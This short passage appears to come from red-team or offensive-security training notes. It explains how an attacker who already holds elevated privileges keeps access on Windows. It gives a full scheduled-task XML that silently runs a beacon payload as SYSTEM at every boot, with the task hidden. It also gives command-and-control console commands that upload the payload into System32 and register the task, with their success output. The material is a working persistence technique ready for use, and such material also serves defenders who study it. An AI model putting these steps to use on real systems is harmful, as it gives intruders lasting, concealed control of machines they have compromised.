The Windows Task Scheduler can execute tasks as SYSTEM as well as standard users.  When elevated privileges has been achieved on a machine, the adversary can maintain that level of access by creating a task that will re-execute a payload on a trigger of their choosing.

The following XML will add a task that will run under the context of SYSTEM when the computer boots up.

```xml
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<Triggers>
		<BootTrigger>
			<Enabled>true</Enabled>
		</BootTrigger>
	</Triggers>
	<Principals>
		<Principal>
			<UserId>NT AUTHORITY\SYSTEM</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
	</Settings>
	<Actions>
		<Exec>
			<Command>C:\Windows\System32\beacon_x64.exe</Command>
		</Exec>
	</Actions>
</Task>
```

```powershell
beacon> cd C:\Windows\System32
beacon> upload C:\Payloads\beacon_x64.exe
beacon> schtaskscreate \Beacon XML CREATE

createTask hostname: taskpath:\Beacon mode:2 force:0
Got user name and security descriptor
Valitdated task
Created task path
Registered task
SUCCESS.
```